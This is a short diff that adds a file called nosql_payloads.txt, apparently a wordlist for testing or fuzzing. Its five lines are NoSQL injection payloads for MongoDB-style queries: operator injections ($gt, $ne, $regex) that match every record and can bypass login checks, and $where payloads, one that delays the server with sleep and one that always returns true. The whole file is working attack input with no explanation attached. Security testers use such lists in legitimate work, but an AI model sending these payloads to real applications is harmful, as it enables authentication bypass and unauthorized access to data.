@@ -1,0 +1,6 @@
+# nosql_payloads.txt
+{"$gt": ""}
+{"$ne": null}
+{"$regex": ".*"}
+{"$where": "sleep(2000)"}
+{"$where": "function(){return true;}"}
